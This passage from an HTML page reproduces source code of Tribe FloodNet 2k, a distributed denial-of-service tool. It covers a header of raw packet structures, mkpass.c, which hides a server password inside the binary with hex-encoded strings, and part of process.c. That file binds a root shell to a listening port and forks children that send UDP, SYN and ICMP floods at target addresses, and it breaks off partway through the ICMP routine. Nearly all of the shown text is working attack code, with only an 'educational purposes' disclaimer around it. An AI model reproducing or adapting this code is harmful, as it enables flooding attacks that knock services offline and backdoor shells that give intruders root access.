<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">typedef char s8;</font>
<br><font color="#FF0000">typedef unsigned char u8;</font>
<br><font color="#FF0000">typedef short int s16;</font>
<br><font color="#FF0000">typedef unsigned short int u16;</font>
<br><font color="#FF0000">typedef int s32;</font>
<br><font color="#FF0000">typedef unsigned int u32;</font>
<p><font color="#FF0000">#define ICMP_ECHOREPLY 0</font>
<br><font color="#FF0000">#define ICMP_ECHO 8</font>
<p><font color="#FF0000">#ifndef htons</font>
<p><font color="#FF0000">#if __BYTE_ORDER == __BIG_ENDIAN</font>
<br><font color="#FF0000">#define ntohl(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(x)</font>
<br><font color="#FF0000">#define ntohs(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(x)</font>
<br><font color="#FF0000">#define htonl(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(x)</font>
<br><font color="#FF0000">#define htons(x)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
(x)</font>
<br><font color="#FF0000">#else</font>
<br><font color="#FF0000">unsigned long int htonl (unsigned long int hostlong);</font>
<br><font color="#FF0000">unsigned short int htons (unsigned short int
hostshort);</font>
<br><font color="#FF0000">unsigned long int ntohl (unsigned long int netlong);</font>
<br><font color="#FF0000">unsigned short int ntohs (unsigned short int
netshort);</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">#endif</font>
<p><font color="#FF0000">#define IP 0</font>
<br><font color="#FF0000">#define ICMP 1</font>
<br><font color="#FF0000">#define IGMP 2</font>
<br><font color="#FF0000">#define TCP 6</font>
<br><font color="#FF0000">#define UDP 17</font>
<br><font color="#FF0000">#define RAW 255</font>
<p><font color="#FF0000">struct sa</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 fam, dp;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u32 add;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 zero[8];</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">struct su</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 fam;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; char path[108];</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">struct ip</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">#if __BYTE_ORDER == __LITTLE_ENDIAN</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 ihl:4, ver:4;</font>
<br><font color="#FF0000">#else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 ver:4, ihl:4;</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 tos;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 tl, id, off;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 ttl, pro;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 sum;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u32 src, dst;</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">struct tcp</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 src, dst;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u32 seq, ack;</font>
<br><font color="#FF0000">#if __BYTE_ORDER == __LITTLE_ENDIAN</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 x2:4, off:4;</font>
<br><font color="#FF0000">#else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 off:4, x2:4;</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 flg;&nbsp;&nbsp; /* flag1
| flag2 */</font>
<br><font color="#FF0000">#define FIN&nbsp; 0x01</font>
<br><font color="#FF0000">#define SYN&nbsp; 0x02</font>
<br><font color="#FF0000">#define RST&nbsp; 0x04</font>
<br><font color="#FF0000">#define PUSH 0x08</font>
<br><font color="#FF0000">#define ACK&nbsp; 0x10</font>
<br><font color="#FF0000">#define URG&nbsp; 0x20</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 win, sum, urp;</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">struct udp</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 src, dst, len, sum;</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">struct icmp</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u8 type, code;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 sum;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; u16 id, seq;</font>
<br><font color="#FF0000">&nbsp; };</font>
<p><font color="#FF0000">#ifndef in_addr</font>
<br><font color="#FF0000">struct in_addr</font>
<br><font color="#FF0000">&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; unsigned long int s_addr;</font>
<br><font color="#FF0000">&nbsp; };</font>
<br><font color="#FF0000">#endif</font>
<p><font color="#FF0000">char *inet_ntoa (struct in_addr);</font>
<br><font color="#FF0000">unsigned long int inet_addr (const char *cp);</font>
<br><font color="#FF0000">u16 cksum (u16 *, int);</font>
<br><font color="#FF0000">unsigned short ip_sum (unsigned short *, int);</font>
<br><font color="#FF0000">char *ntoa (u32);</font>
<br><font color="#FF0000">int isip (char *);</font>
<br><font color="#FF0000">unsigned long resolve (char *);</font>
<p><font color="#FF0000">#endif</font>
<br>
<hr WIDTH="100%">
<center><font color="#3333FF"><font size=+1>mkpass.c</font></font></center>

<p><font color="#3333FF">/* mkpass - creates a temporary source file that
uses random alignment</font>
<br><font color="#3333FF">&nbsp;&nbsp; and other fancy stuff to disguise
a 256 bit password in an executable</font>
<br><font color="#3333FF">&nbsp;&nbsp; (No, this is not 100% SECURE, it
just makes it awfully HARD to</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; find the password) - Mixter
*/</font>
<p><font color="#3333FF">#include &lt;stdio.h></font>
<br><font color="#3333FF">#include &lt;stdlib.h></font>
<br><font color="#3333FF">#include &lt;string.h></font>
<br><font color="#3333FF">#include &lt;unistd.h></font>
<br><font color="#3333FF">#include &lt;sys/types.h></font>
<br><font color="#3333FF">#include &lt;sys/stat.h></font>
<br><font color="#3333FF">#include &lt;fcntl.h></font>
<p><font color="#3333FF">char *getpass (const char *prompt);</font>
<p><font color="#3333FF">static char *header =</font>
<br><font color="#3333FF">"\x2f\x2a\x20\x50\x41\x53\x53\x2e\x68\x20\x2d\x20\x74\x65\x6d\x70\x6f\x72"</font>
<br><font color="#3333FF">"\x61\x72\x79\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x69\x6e\x63\x6c\x75"</font>
<br><font color="#3333FF">"\x64\x65\x0a\x20\x20\x20\x44\x45\x4c\x45\x54\x45\x20\x74\x68\x69\x73\x20"</font>
<br><font color="#3333FF">"\x66\x69\x6c\x65\x20\x61\x66\x74\x65\x72\x20\x63\x6f\x6d\x70\x69\x6c\x61"</font>
<br><font color="#3333FF">"\x74\x69\x6f\x6e\x20\x21\x20\x2a\x2f\x0a\x0a\x23\x69\x6e\x63\x6c\x75\x64"</font>
<br><font color="#3333FF">"\x65\x20\x22\x61\x65\x73\x2e\x68\x22\x0a\x0a\x63\x68\x61\x72\x0a";</font>
<p><font color="#3333FF">static char *function =</font>
<br><font color="#3333FF">"\x76\x6f\x69\x64\x20\x73\x65\x63\x75\x72\x69\x74\x79\x5f\x74\x68\x72\x6f"</font>
<br><font color="#3333FF">"\x75\x67\x68\x5f\x6f\x62\x73\x63\x75\x72\x69\x74\x79\x20\x28\x20\x69\x6e"</font>
<br><font color="#3333FF">"\x74\x20\x73\x77\x31\x74\x63\x68\x20\x29\x0a\x7b\x0a\x63\x68\x61\x72\x20"</font>
<br><font color="#3333FF">"\x68\x69\x5b\x33\x32\x5d\x3b\x0a\x0a\x69\x66\x20\x28\x21\x73\x77\x31\x74"</font>
<br><font color="#3333FF">"\x63\x68\x29\x20\x61\x65\x73\x5f\x73\x65\x74\x6b\x65\x79\x28\x22\x22\x29"</font>
<br><font color="#3333FF">"\x3b\x0a\x20\x20\x65\x6c\x73\x65\x0a\x20\x7b\x0a\x20\x68\x69\x5b\x30\x5d"</font>
<br><font color="#3333FF">"\x20\x3d\x20\x5f\x63\x31\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31"</font>
<br><font color="#3333FF">"\x5d\x20\x3d\x20\x5f\x63\x32\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b"</font>
<br><font color="#3333FF">"\x32\x5d\x20\x3d\x20\x5f\x63\x33\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69"</font>
<br><font color="#3333FF">"\x5b\x33\x5d\x20\x3d\x20\x5f\x63\x34\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68"</font>
<br><font color="#3333FF">"\x69\x5b\x34\x5d\x20\x3d\x20\x5f\x63\x35\x20\x2d\x20\x61\x6c\x3b\x0a\x20"</font>
<br><font color="#3333FF">"\x68\x69\x5b\x35\x5d\x20\x3d\x20\x5f\x63\x36\x20\x2d\x20\x61\x6c\x3b\x0a"</font>
<br><font color="#3333FF">"\x20\x68\x69\x5b\x36\x5d\x20\x3d\x20\x5f\x63\x37\x20\x2d\x20\x61\x6c\x3b"</font>
<br><font color="#3333FF">"\x0a\x20\x68\x69\x5b\x37\x5d\x20\x3d\x20\x5f\x63\x38\x20\x2d\x20\x61\x6c"</font>
<br><font color="#3333FF">"\x3b\x0a\x20\x68\x69\x5b\x38\x5d\x20\x3d\x20\x5f\x63\x39\x20\x2d\x20\x61"</font>
<br><font color="#3333FF">"\x6c\x3b\x0a\x20\x68\x69\x5b\x39\x5d\x20\x3d\x20\x5f\x63\x31\x30\x20\x2d"</font>
<br><font color="#3333FF">"\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x30\x5d\x20\x3d\x20\x5f\x63\x31"</font>
<br><font color="#3333FF">"\x31\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x31\x5d\x20\x3d\x20"</font>
<br><font color="#3333FF">"\x5f\x63\x31\x32\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x32\x5d"</font>
<br><font color="#3333FF">"\x20\x3d\x20\x5f\x63\x31\x33\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b"</font>
<br><font color="#3333FF">"\x31\x33\x5d\x20\x3d\x20\x5f\x63\x31\x34\x20\x2d\x20\x61\x6c\x3b\x0a\x20"</font>
<br><font color="#3333FF">"\x68\x69\x5b\x31\x34\x5d\x20\x3d\x20\x5f\x63\x31\x35\x20\x2d\x20\x61\x6c"</font>
<br><font color="#3333FF">"\x3b\x0a\x20\x68\x69\x5b\x31\x35\x5d\x20\x3d\x20\x5f\x63\x31\x36\x20\x2d"</font>
<br><font color="#3333FF">"\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x36\x5d\x20\x3d\x20\x5f\x63\x31"</font>
<br><font color="#3333FF">"\x37\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x37\x5d\x20\x3d\x20"</font>
<br><font color="#3333FF">"\x5f\x63\x31\x38\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x31\x38\x5d"</font>
<br><font color="#3333FF">"\x20\x3d\x20\x5f\x63\x31\x39\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b"</font>
<br><font color="#3333FF">"\x31\x39\x5d\x20\x3d\x20\x5f\x63\x32\x30\x20\x2d\x20\x61\x6c\x3b\x0a\x20"</font>
<br><font color="#3333FF">"\x68\x69\x5b\x32\x30\x5d\x20\x3d\x20\x5f\x63\x32\x31\x20\x2d\x20\x61\x6c"</font>
<br><font color="#3333FF">"\x3b\x0a\x20\x68\x69\x5b\x32\x31\x5d\x20\x3d\x20\x5f\x63\x32\x32\x20\x2d"</font>
<br><font color="#3333FF">"\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x32\x32\x5d\x20\x3d\x20\x5f\x63\x32"</font>
<br><font color="#3333FF">"\x33\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x32\x33\x5d\x20\x3d\x20"</font>
<br><font color="#3333FF">"\x5f\x63\x32\x34\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x32\x34\x5d"</font>
<br><font color="#3333FF">"\x20\x3d\x20\x5f\x63\x32\x35\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b"</font>
<br><font color="#3333FF">"\x32\x35\x5d\x20\x3d\x20\x5f\x63\x32\x36\x20\x2d\x20\x61\x6c\x3b\x0a\x20"</font>
<br><font color="#3333FF">"\x68\x69\x5b\x32\x36\x5d\x20\x3d\x20\x5f\x63\x32\x37\x20\x2d\x20\x61\x6c"</font>
<br><font color="#3333FF">"\x3b\x0a\x20\x68\x69\x5b\x32\x37\x5d\x20\x3d\x20\x5f\x63\x32\x38\x20\x2d"</font>
<br><font color="#3333FF">"\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x32\x38\x5d\x20\x3d\x20\x5f\x63\x32"</font>
<br><font color="#3333FF">"\x39\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x32\x39\x5d\x20\x3d\x20"</font>
<br><font color="#3333FF">"\x5f\x63\x33\x30\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b\x33\x30\x5d"</font>
<br><font color="#3333FF">"\x20\x3d\x20\x5f\x63\x33\x31\x20\x2d\x20\x61\x6c\x3b\x0a\x20\x68\x69\x5b"</font>
<br><font color="#3333FF">"\x33\x31\x5d\x20\x3d\x20\x5f\x63\x33\x32\x20\x2d\x20\x61\x6c\x3b\x0a\x20"</font>
<br><font color="#3333FF">"\x61\x65\x73\x5f\x73\x65\x74\x6b\x65\x79\x28\x68\x69\x29\x3b\x0a\x20\x7d"</font>
<br><font color="#3333FF">"\x0a\x7d\x0a";</font>
<p><font color="#3333FF">int</font>
<br><font color="#3333FF">main (void)</font>
<br><font color="#3333FF">{</font>
<br><font color="#3333FF">&nbsp; char al, *p, c[32], buf[64];</font>
<br><font color="#3333FF">&nbsp; int i, fd;</font>
<br><font color="#3333FF">&nbsp; memset (c, 0, sizeof (c));</font>
<br><font color="#3333FF">&nbsp; srand (getpid ());</font>
<br><font color="#3333FF">&nbsp; al = (rand () % 40) + 1;</font>
<br><font color="#3333FF">dufus:</font>
<br><font color="#3333FF">&nbsp; p = getpass ("server key [8 - 32 chars]:
");</font>
<br><font color="#3333FF">#ifdef DEBUG_INSECURE</font>
<br><font color="#3333FF">&nbsp; printf ("Your password is '%s'.\n", p);</font>
<br><font color="#3333FF">#endif</font>
<br><font color="#3333FF">&nbsp; if ((strlen (p) > 32) || (strlen (p) &lt;
8))</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; goto dufus;</font>
<br><font color="#3333FF">&nbsp; for (i = 0; i &lt;= strlen (p); i++)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; c[i] = p[i];</font>
<br><font color="#3333FF">&nbsp; fd = open ("pass.c", O_WRONLY | O_TRUNC
| O_CREAT);</font>
<br><font color="#3333FF">&nbsp; write (fd, header, strlen (header));</font>
<br><font color="#3333FF">&nbsp; for (i = 0; i &lt; 31; i++)</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; memset (buf, 0,
64);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sprintf (buf,
" _c%d = %d + %d,\n", i + 1, c[i], al);</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; write (fd, buf,
strlen (buf));</font>
<br><font color="#3333FF">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#3333FF">&nbsp; memset (buf, 0, 64);</font>
<br><font color="#3333FF">&nbsp; sprintf (buf, " _c32 = %d + %d;\n\n",
c[31], al);</font>
<br><font color="#3333FF">&nbsp; write (fd, buf, strlen (buf));</font>
<br><font color="#3333FF">&nbsp; memset (buf, 0, 64);</font>
<br><font color="#3333FF">&nbsp; sprintf (buf, " int al = %d;\n\n", al);</font>
<br><font color="#3333FF">&nbsp; write (fd, buf, strlen (buf));</font>
<br><font color="#3333FF">&nbsp; memset (buf, 0, 64);</font>
<br><font color="#3333FF">&nbsp; write (fd, function, strlen (function));</font>
<br><font color="#3333FF">&nbsp; close (fd);</font>
<br><font color="#3333FF">&nbsp; printf ("compiling server with %d byte
password...\n", strlen (c));</font>
<br><font color="#3333FF">&nbsp; return (0);</font>
<br><font color="#3333FF">}</font>
<br>
<hr WIDTH="100%">
<center><font color="#FF0000"><font size=+1>process.c</font></font></center>

<p><font color="#FF0000">/*</font>
<br><font color="#FF0000">&nbsp;* Tribe FloodNet - 2k edition</font>
<br><font color="#FF0000">&nbsp;* by Mixter &lt;mixter@newyorkoffice.com></font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* process.c - flood / shell server thread
management</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;* This program is distributed for educational
purposes and without any</font>
<br><font color="#FF0000">&nbsp;* explicit or implicit warranty; in no
event shall the author or</font>
<br><font color="#FF0000">&nbsp;* contributors be liable for any direct,
indirect or incidental damages</font>
<br><font color="#FF0000">&nbsp;* arising in any way out of the use of
this software.</font>
<br><font color="#FF0000">&nbsp;*</font>
<br><font color="#FF0000">&nbsp;*/</font>
<p><font color="#FF0000">#include "tribe.h"</font>
<p><font color="#FF0000">unsigned long myip = 2130706433; /* 127.0.0.1
network byte ordered */</font>
<br><font color="#FF0000">extern int fw00ding, nospoof, rawsock;</font>
<br><font color="#FF0000">int pid[CHLD_MAX + 5];</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">shellsex (int port)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int s1, s2, s3;</font>
<br><font color="#FF0000">&nbsp; struct sa s_a, c_a;</font>
<p><font color="#FF0000">&nbsp; if (fork ())</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; return;</font>
<p><font color="#FF0000">&nbsp; setuid (0);</font>
<br><font color="#FF0000">&nbsp; setgid (0);</font>
<br><font color="#FF0000">#ifndef WINDOZE</font>
<br><font color="#FF0000">&nbsp; setreuid (0, 0);</font>
<br><font color="#FF0000">&nbsp; setregid (0, 0);</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp; s1 = socket (AF_INET, SOCK_STREAM, TCP);</font>
<br><font color="#FF0000">&nbsp; bzero ((char *) &amp;s_a, sizeof (s_a));</font>
<br><font color="#FF0000">&nbsp; s_a.fam = AF_INET;</font>
<br><font color="#FF0000">&nbsp; s_a.add = htonl (INADDR_ANY);</font>
<br><font color="#FF0000">&nbsp; s_a.dp = htons (port);</font>
<br><font color="#FF0000">&nbsp; if (bind (s1, (struct sockaddr *) &amp;s_a,
sizeof (s_a)) &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp; if (listen (s1, 1) &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; exit (0);</font>
<p><font color="#FF0000">&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s3 = sizeof (c_a);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; s2 = accept (s1,
(struct sockaddr *) &amp;c_a, &amp;s3);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2 (s2, 0);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2 (s2, 1);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2 (s2, 2);</font>
<br><font color="#FF0000">#ifndef WINDOZE</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (execlp ("sh",
"sh", (char *) 0) &lt; 0)</font>
<br><font color="#FF0000">&nbsp;execlp ("ksh", "ksh", (char *) 0); /* yech,
no sh */</font>
<br><font color="#FF0000">#else</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (execlp ("command.exe",
"command.exe", (char *) 0) &lt; 0)</font>
<br><font color="#FF0000">&nbsp;execlp ("cmd.exe", "cmd.exe", (char *)
0); /* yech, windoze neanderthal technology */</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close (s2);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_udp (char *ip)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resolved = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, UDP);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; udp (resolved);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmp[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmp, "PID %d forking (#%d), child
(%d) attacks %s, UDP\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmp);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<p><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_syn (char *ip, int port)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resolved = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, TCP);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
<br><font color="#FF0000">&nbsp;&nbsp; while (1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; syn (resolved, port);</font>
<br><font color="#FF0000">&nbsp;}</font>
<br><font color="#FF0000">#ifdef ATTACKLOG</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;char tmpbuf[100];</font>
<br><font color="#FF0000">&nbsp;sprintf (tmpbuf, "PID %d forking (#%d),
child (%d) attacks %s, SYN\n"</font>
<br><font color="#FF0000">&nbsp;&nbsp; ,getpid (), i, p, parse);</font>
<br><font color="#FF0000">&nbsp;dbug (tmpbuf);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">#endif</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pid[i] = p;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; parse = strtok
(NULL, DELIMITER);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">}</font>
<p><font color="#FF0000">void</font>
<br><font color="#FF0000">commence_icmp (char *ip)</font>
<br><font color="#FF0000">{</font>
<br><font color="#FF0000">&nbsp; int i = -1, p;</font>
<br><font color="#FF0000">&nbsp; unsigned long resolved = 0;</font>
<br><font color="#FF0000">&nbsp; char *parse;</font>
<p><font color="#FF0000">&nbsp; if ((parse = strtok (ip, DELIMITER)) ==
NULL)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fw00ding = 0;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; }</font>
<br><font color="#FF0000">&nbsp; while ((parse != NULL) &amp;&amp; (i++
&lt; CHLD_MAX))</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp; {</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; resolved = resolve
(parse);</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; p = fork ();</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (!p)</font>
<br><font color="#FF0000">&nbsp;{</font>
<br><font color="#FF0000">&nbsp;&nbsp; rawsock = socket (AF_INET, SOCK_RAW,
RAW);</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (rawsock &lt; 0)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; rawsock = socket (AF_INET,
SOCK_RAW, ICMP);</font>
<br><font color="#FF0000">&nbsp;&nbsp; setsockopt (rawsock, IP, IP_HDRINCL,
"1", sizeof ("1"));</font>
<br><font color="#FF0000">&nbsp;&nbsp; if (resolved == -1)</font>
<br><font color="#FF0000">&nbsp;&nbsp;&nbsp;&nbsp; exit (0);</font>
